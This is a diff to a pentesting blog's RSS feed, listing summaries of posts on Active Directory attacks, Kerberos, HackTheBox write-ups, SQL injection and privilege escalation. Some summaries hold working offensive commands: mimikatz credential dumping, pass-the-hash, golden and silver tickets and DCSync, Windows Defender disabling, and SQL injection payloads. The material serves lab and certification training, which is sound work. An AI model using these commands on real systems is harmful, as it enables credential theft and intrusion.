@@ -1,10 +1,267 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
-    <title>noobsec blog</title>
-    <link>http://example.org/</link>
-    <description>Recent content on noobsec blog</description>
+    <title>Welcome to noobsec</title>
+    <link>http://localhost:1313/</link>
+    <description>Recent content on Welcome to noobsec</description>
     <generator>Hugo -- gohugo.io</generator>
-    <language>en-us</language><atom:link href="http://example.org/index.xml" rel="self" type="application/rss+xml" />
+    <language>en-us</language>
+    <lastBuildDate>Sun, 05 Jun 2022 22:31:33 +0530</lastBuildDate><atom:link href="http://localhost:1313/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Active Directory Cheatsheet</title>
+      <link>http://localhost:1313/ad-cheatsheet/</link>
+      <pubDate>Sun, 12 Jun 2022 00:36:33 +0530</pubDate>
+      
+      <guid>http://localhost:1313/ad-cheatsheet/</guid>
+      <description>Active Directory (AD) Cheatsheet This post assumes that opsec is not required and you can be as noisy as may be required to perform the enumeration and lateral movement. This post is meant for pentesters as well as defenders for the same reason - understand the AD environment better.
+This cheatsheet would help some certifications like CRTP, OSCP, PNPT, and such.
+Note: Only a subset of flags and switches, which are most commonly used, are shared.</description>
+    </item>
+    
+    <item>
+      <title>Kerberoasting</title>
+      <link>http://localhost:1313/activedirectory/kerberoast/</link>
+      <pubDate>Fri, 15 Oct 2021 22:17:51 +0000</pubDate>
+      
+      <guid>http://localhost:1313/activedirectory/kerberoast/</guid>
+      <description>Attacking Kerberos - Kerberoasting Introduction Kerberoasting is a very popular attack in the Active Directory realm since over 6 years now. Attacking guard dog of Hades by Tim Meddin
+Overview In any organization that is using Active Directory, the authentication process is done via Kerberos since a while now. While Kerberos is a secure network authentication protocol, there are several gaps inherently with the way it works. To read about how Kerberos works in more detail, you can read Introduction to Kerberos post.</description>
+    </item>
+    
+    <item>
+      <title>Introduction to Kerberos</title>
+      <link>http://localhost:1313/activedirectory/kerberos-intro/</link>
+      <pubDate>Fri, 15 Oct 2021 15:21:59 +0000</pubDate>
+      
+      <guid>http://localhost:1313/activedirectory/kerberos-intro/</guid>
+      <description>Introduction to Kerberos Hi and welcome to the second post in the Active Directory series. In this post, we will start off with what kerberos even is and then dive in to understand how the authentication work. With that said, let&amp;rsquo;s get started.
+What is Kerberos? Kerberos is a network authentication protocol, first developed by the folks at MIT and was later adopted by Microsoft to incorporate it as their default authentication method.</description>
+    </item>
+    
+    <item>
+      <title>Introduction to Active Directory</title>
+      <link>http://localhost:1313/activedirectory/ad-intro/</link>
+      <pubDate>Sun, 10 Oct 2021 08:23:07 +0000</pubDate>
+      
+      <guid>http://localhost:1313/activedirectory/ad-intro/</guid>
+      <description>Introduction to Active Directory Prologue Hello there! Welcome to the first post in the Active Directory series, this post talks about AD in brief and does not go in detail at all. The objective of this post is to have a starting point in the series of AD related posts and can assist a person in understanding what AD is in general before learning about either attacks or defenses in AD.</description>
+    </item>
+    
+    <item>
+      <title>CRTP Cheatsheet</title>
+      <link>http://localhost:1313/crtp-cheatsheet/</link>
+      <pubDate>Wed, 23 Dec 2020 22:30:19 +0000</pubDate>
+      
+      <guid>http://localhost:1313/crtp-cheatsheet/</guid>
+      <description>CRTP Cheatsheet This cheatsheet corresponds to an older version of PowerView deliberately as this is the version that was used in Pentester Academys&amp;rsquo; CRTP certification course. Updated AD enumeration (PowerView/SharpHound) cheatsheet can be found at AD Enumeration
+Helpful Commands Commands to help use PowerView even better.
+Command Description Set-MpPreference -DisableRealTimeMonitoring $true Disable Windows Defender real time monitoring Set-MpPreference -DisableIOAVProtection $true Disable Windows Defender scanning for all files downloaded Disabling Defender even if for a small amount of time puts the assets at risk, instead one could opt for bypassing AMSI using this resource.</description>
+    </item>
+    
+    <item>
+      <title>mimikatz-cheatsheet</title>
+      <link>http://localhost:1313/mimikatz-cheatsheet/</link>
+      <pubDate>Sun, 22 Nov 2020 17:20:01 +0000</pubDate>
+      
+      <guid>http://localhost:1313/mimikatz-cheatsheet/</guid>
+      <description>Mimikatz Cheatsheet Dump Creds Invoke-Mimikatz -DumpCredsInvoke-Mimikatz -DumpCreds -ComputerName @(&amp;quot;server1&amp;quot;,&amp;quot;server2&amp;quot;)Over Pass The Hash Invoke-Mimikatz -Command &amp;quot;sekurlsa::pth /user:Administrator /domain:dollarcorp.moneycorp.local /ntlm:&amp;lt;ntlm_hash&amp;gt; /run:powershell.exe&amp;quot;Dump Hashes Invoke-Mimikatz -Command &#39;&amp;quot;lsadump::lsa /patch&amp;quot;&#39; -ComputerName dcorp-dcCreating Tickets Create A Golden Ticket Invoke-Mimikatz -Command &#39;&amp;quot;kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:&amp;lt;domain_SID&amp;gt; /krbtgt:&amp;lt;NTLM_hash&amp;gt; id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt&amp;quot;&#39;Create A Silver Ticket Invoke-Mimikatz -Command &#39;&amp;quot;kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:CIFS /rc4:6f5b5acaf7433b3282ac22e21e62ff22 /user:Administrator /ptt&amp;quot;&#39;DCSync Attack DA privileges required!
+Invoke-Mimikatz -Command &#39;&amp;quot;lsadump::dcsync /user:dcorp\krbtgt&amp;quot;&#39; </description>
+    </item>
+    
+    <item>
+      <title>Getting Into Cybersecurity - Red Team Edition</title>
+      <link>http://localhost:1313/starting-point/</link>
+      <pubDate>Mon, 31 Aug 2020 15:48:04 +0000</pubDate>
+      
+      <guid>http://localhost:1313/starting-point/</guid>
+      <description>Getting Into Cybersecurity - Red Team Edition Introduction I came across this question and was asked so often that I decided to turn it into a blog post.
+Since finance is one of the biggest barrier that one could face, every resource listed here will be either completely free or at least provide a good amount of free resources/content.
+Disclaimer The following suggestions will be more towards getting into penetration testing or red teaming but if that is not your thing or rather you do not know what your thing is I would highly recommend reading through Lesley Carharts&amp;rsquo; Starting an InfoSec Career - The Megamix series.</description>
+    </item>
+    
+    <item>
+      <title>HackTheBox - Bart Writeup w/o Metasploit</title>
+      <link>http://localhost:1313/hackthebox/htb-bart/</link>
+      <pubDate>Tue, 11 Aug 2020 17:22:10 +0000</pubDate>
+      
+      <guid>http://localhost:1313/hackthebox/htb-bart/</guid>
+      <description>HackTheBox - Bart Writeup w/o Metasploit Introduction Bart is a retired Windows machine from HackTheBox. It has been rated as a medium difficulty machine, as it requires you to spend a good amount of time to enumerate but the exploiting part is not so hard.
+We are presented with just one service - HTTP, consists of three different sites, we abuse a user enumeration functionality for first login, we perform some OSINT to get around the next login, and then abuse a &amp;ldquo;LFI&amp;rdquo; vulnerability to poison the logs.</description>
+    </item>
+    
+    <item>
+      <title>HackTheBox - Bashed Writeup w/o Metasploit</title>
+      <link>http://localhost:1313/hackthebox/htb-bashed/</link>
+      <pubDate>Sat, 08 Aug 2020 23:43:37 +0000</pubDate>
+      
+      <guid>http://localhost:1313/hackthebox/htb-bashed/</guid>
+      <description>HackTheBox - Bashed Writeup w/o Metasploit Introduction Bashed is a retired HackTheBox machine, rated easy and rightfully so. We go from finding a hidden web shell to quickly gaining root due to over privileged users. I present a small discussion at the end of the write-up that I had with some folks on what steps could be taken to secure something like this on a corporate level, not really necessary but fun.</description>
+    </item>
+    
+    <item>
+      <title>HackTheBox - Lame Writeup w/o Metasploit</title>
+      <link>http://localhost:1313/hackthebox/htb-lame/</link>
+      <pubDate>Sat, 01 Aug 2020 19:03:06 +0000</pubDate>
+      
+      <guid>http://localhost:1313/hackthebox/htb-lame/</guid>
+      <description>HackTheBox - Lame Writeup w/o Metasploit Introduction Lame was the first machine on the HackTheBox platform, it is very much like any other Boot2Root machine but is good for beginners. Lame is a Linux machine and has rightfully rated as Easy by the platform. There are 2 ways to own the machine and a false positive which may or may not lead to a rabbit hole, depending on the way you approach it.</description>
+    </item>
+    
+    <item>
+      <title>MySQL Injection Cheatsheet</title>
+      <link>http://localhost:1313/sqli-cheatsheet/</link>
+      <pubDate>Wed, 29 Jul 2020 13:10:00 +0000</pubDate>
+      
+      <guid>http://localhost:1313/sqli-cheatsheet/</guid>
+      <description>MySQL Injection cheatsheet Testing checklist Name Character Function Single quote &#39; String terminator Semi colon ; Query terminator Comment -- - Removes the rest of the query Comment # Removes the rest of the query Comment /*comment this*/ Can be placed anywhere in a query, used for bypassing weak filters Single quote with a comment &#39;-- - End a string and remove rest of the query Single quote, semi colon and a comment &#39;;-- - End a string, end query, and remove rest of the query OR operator OR 1=1-- - For integers, true test OR operator OR 1=2-- - For integers, false test OR operator &#39; OR &#39;1&#39;=&#39;1&#39;-- - For strings, test test AND operator AND 1=1-- - For integers, true test AND operator AND 1=2-- - For integers, false test AND operator &#39; AND &#39;1&#39;=&#39;1&#39;-- - For strings, true test Arithmetic ?</description>
+    </item>
+    
+    <item>
+      <title>HackTheBox - Falafel Writeup w/o Metasploit</title>
+      <link>http://localhost:1313/hackthebox/htb-falafel-writeup-w-o-metasploit/</link>
+      <pubDate>Sat, 18 Jul 2020 14:46:16 +0000</pubDate>
+      
+      <guid>http://localhost:1313/hackthebox/htb-falafel-writeup-w-o-metasploit/</guid>
+      <description>HackTheBox - Falafel Writeup w/o Metasploit Introduction Falafel is a retired HackTheBox machine and one of the most interesting machines I have hacked on the platform. It is a Linux machine with some really fun vulnerabilities to exploit. The machine is rated hard but the author was kind enough to give us hints as we hack through it. The machine requires you to know a range of nuances from SQLi to Linux filesystems.</description>
+    </item>
+    
+    <item>
+      <title>SQL Injection 0x03 - Blind Boolean Attacks</title>
+      <link>http://localhost:1313/sqli-0x03/</link>
+      <pubDate>Sat, 18 Jul 2020 14:37:47 +0000</pubDate>
+      
+      <guid>http://localhost:1313/sqli-0x03/</guid>
+      <description>SQL Injection 0x03 - Blind Boolean Attacks Introduction Blind SQL injection are the type of SQL injections attacks wherein no database error is received from the web responses, there are either subtle or no changes to the web page upon sending injection payloads. Since these changes are either subtle or non-existent, it becomes harder to identify and exploit these vulnerabilities but are certainly not impossible.
+Hi, welcome to the third part of the SQL injection series, if you haven&amp;rsquo;t read the first two posts and are a complete beginner I&amp;rsquo;d suggest you read them first - SQL Injection 0x01 - Introduction and SQL Injection 0x02 - Testing &amp;amp; UNION Attacks.</description>
+    </item>
+    
+    <item>
+      <title>SQL Injection 0x02 - Testing and UNION Attacks</title>
+      <link>http://localhost:1313/sqli-0x02/</link>
+      <pubDate>Fri, 10 Jul 2020 22:31:47 +0000</pubDate>
+      
+      <guid>http://localhost:1313/sqli-0x02/</guid>
+      <description>SQL Injection 0x02 - Testing and UNION Attacks Introduction Hi, welcome to the second post of the sql injection series, if you haven&amp;rsquo;t read the first part of the series, you can read it here.
+In this post I have focused on how to perform testing for error-based SQL injection and then moved on to a general process of performing UNION attacks. I have also covered how you can automate data extraction when the amount of data you are dealing with is a lot.</description>
+    </item>
+    
+    <item>
+      <title>HackTheBox - Cronos Writeup w/o Metasploit</title>
+      <link>http://localhost:1313/hackthebox/htb-cronos/</link>
+      <pubDate>Tue, 07 Jul 2020 01:43:22 +0000</pubDate>
+      
+      <guid>http://localhost:1313/hackthebox/htb-cronos/</guid>
+      <description>HackTheBox - Cronos Writeup w/o Metasploit Introduction Cronos is a HackTheBox retired machine. It is a Linux box, and has been officially rated as medium in difficulty, although I feel the machine is quite easy. Let&amp;rsquo;s jump in.
+Reconnaissance General Enumeration We&amp;rsquo;ll start out with an nmap scan. I always start with a quick initial scan. Command:
+nmap -Pn -n -oN nmap/initial 10.10.10.13Output: We can see that from the top 1000 ports only three are open:</description>
+    </item>
+    
+    <item>
+      <title>SQL Injection - 0x01</title>
+      <link>http://localhost:1313/sqli-0x01/</link>
+      <pubDate>Fri, 03 Jul 2020 16:22:37 +0000</pubDate>
+      
+      <guid>http://localhost:1313/sqli-0x01/</guid>
+      <description>SQL Injection 0x01 Hi, welcome to the first post of the SQL injection series. Before we dive into the &amp;ldquo;injection&amp;rdquo; part of it, let&amp;rsquo;s first understand the basics of what SQL is and the usual structure of a database-driven system.
+Structured Query Language (SQL) SQL is a database querying language which comes in various flavours like MySQL, MS-SQL, PostgreSQL, etc. In this series we&amp;rsquo;ll mainly focus on MySQL
+It&amp;rsquo;s a tabular database system, like Microsoft Excel simply put, with rows and columns.</description>
+    </item>
+    
+    <item>
+      <title>Hack OSCP</title>
+      <link>http://localhost:1313/hack-oscp/</link>
+      <pubDate>Tue, 30 Jun 2020 22:45:33 +0000</pubDate>
+      
+      <guid>http://localhost:1313/hack-oscp/</guid>
+      <description>Hack OSCP - A n00bs Guide Since I cleared OSCP plenty of folks asked me how to clear OSCP, and although I briefly mentioned it in my OSCP Journey post, it was not the whole picture and also not very accessible, and so I&amp;rsquo;m writing this post.
+Please note that PwK is a course you&amp;rsquo;re paying for to learn from, the course teaches you almost everything you need to learn and you&amp;rsquo;ll get to practice in the labs as well.</description>
+    </item>
+    
+    <item>
+      <title>File Inclusion</title>
+      <link>http://localhost:1313/file-inclusion/</link>
+      <pubDate>Mon, 29 Jun 2020 21:44:39 +0000</pubDate>
+      
+      <guid>http://localhost:1313/file-inclusion/</guid>
+      <description>File Inclusion Introduction File inclusion vulnerabilities are of two types: Remote File Inclusion (RFI) and Local File Inclusion (LFI). RFI is said to be present when a web application allows remote users to load and execute a remote file on the server. LFI is said to be present when a web application allows remote users to load any pre-existing file and execute it on the server.
+These vulnerabilities are often found in poorly written and/or deployed web applications which loads files or content to display it to the end-user, completely forgetting that this input could be modified.</description>
+    </item>
+    
+    <item>
+      <title>Linux Privilege Escalation</title>
+      <link>http://localhost:1313/privesc-linux/</link>
+      <pubDate>Mon, 29 Jun 2020 16:33:08 +0000</pubDate>
+      
+      <guid>http://localhost:1313/privesc-linux/</guid>
+      <description>Linux Privilege Escalation Cheatsheet So you got a shell, what now? This cheatsheet will help you with local enumeration as well as escalate your privilege further
+Usage of different enumeration scripts are encouraged, my favourite is LinPEAS Another linux enumeration script I personally use is LinEnum Abuse existing functionality of programs using GTFOBins
+Note: This is a live document. I&amp;rsquo;ll be adding more content as I learn more
+Unstable shell Send yourself another shell from within the unstable shell</description>
+    </item>
+    
+    <item>
+      <title>OSCP Journey</title>
+      <link>http://localhost:1313/oscp-journey/</link>
+      <pubDate>Sat, 27 Jun 2020 10:26:58 +0000</pubDate>
+      
+      <guid>http://localhost:1313/oscp-journey/</guid>
+      <description>OSCP Journey From a persistent n00b who couldn&amp;rsquo;t even hack a medium difficulty machine on his own to cracking OSCP in 4 months!
+Background I wanted to do the PwK course and clear OSCP since past couple years but haven&amp;rsquo;t been able to due to reasons. Two of my certifications were going to expire in August &amp;lsquo;20, and I had to do a certification to renew them, a perfect opportunity. Before I started with the PwK course, I had very little experience with hacking or even CTF for that matter.</description>
+    </item>
+    
+    <item>
+      <title>Buffer Overflow</title>
+      <link>http://localhost:1313/bof/</link>
+      <pubDate>Fri, 26 Jun 2020 18:32:04 +0000</pubDate>
+      
+      <guid>http://localhost:1313/bof/</guid>
+      <description>Windows 32-Bit Buffer Overflow SLMail Example
+Practice these:
+SLMail - download from exploit-db Brainpan - download from vulnhub Step By Step Scripts All the scripts are available here as well as at the bottom.
+connect.py Making sure connection and all the operations are successfully performed is crucial as everything will be built on this script/step.
+import socketimport sysrhost = &amp;quot;192.168.&amp;quot;rport = 110try:s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)s.connect((rhost,rport))print s.</description>
+    </item>
+    
+    <item>
+      <title>Windows Privilege Escalation</title>
+      <link>http://localhost:1313/privesc-windows/</link>
+      <pubDate>Fri, 26 Jun 2020 18:05:42 +0000</pubDate>
+      
+      <guid>http://localhost:1313/privesc-windows/</guid>
+      <description>Windows Privilege Escalation Cheatsheet Latest updated as of: 12 / June / 2022
+So you got a shell, what now?
+This post will help you with local enumeration as well as escalate your privileges further.
+Usage of different enumeration scripts and tools is encouraged, my favourite is WinPEAS. If confused which executable to use, use this
+Keep in mind:
+To exploit services or registry, you require: appropriate write permissions service start permission service stop permission Look for non-standard programs on the system Note: This is a live document.</description>
+    </item>
+    
+    <item>
+      <title>root@localhost:~ #whoami</title>
+      <link>http://localhost:1313/whoami/</link>
+      <pubDate>Thu, 25 Jun 2020 09:00:37 +0000</pubDate>
+      
+      <guid>http://localhost:1313/whoami/</guid>
+      <description>Who Am I? Hi, my name is Karan Bhayani. I am a security professional who likes learning new things.
+I like to believe that only understanding how to attack and/or defend something is not sufficient and we should understand how things truly work. I am currently interested in Windows and Active Directory. Here are few papers I hold that says I know something
+&amp;hellip;and CRTP
+Connect With Me Have a question, suggestion, constructive criticism, or just wanna chat?</description>
+    </item>
+    
+    <item>
+      <title>OSCP Cheatsheet</title>
+      <link>http://localhost:1313/oscp-cheatsheet/</link>
+      <pubDate>Thu, 25 Jun 2020 08:51:22 +0000</pubDate>
+      
+      <guid>http://localhost:1313/oscp-cheatsheet/</guid>
+      <description>OSCP Cheatsheet General Enumeration - Nmap Replace $ip with target IP
+Initial scan
+nmap -Pn -n -vvv -oN nmap/initial $ipIf no ports are found, scan in parts
+nmap -Pn -n -vvv -p1-500 -oN nmap/partial $ipScan all ports
+nmap -Pn -n -vvv -p- -oN nmap/allports $ipTargeted scanning
+nmap -Pn -n -vvv -p22,80 -oN nmap/targeted $ipUDP Scanning
+sudo nmap -Pn -n -vvv -sU -oN nmap/udp $ipAutomated nmap scanning (my preference is nmapAutomator, never missed a port)</description>
+    </item>
+    
   </channel>
 </rss>
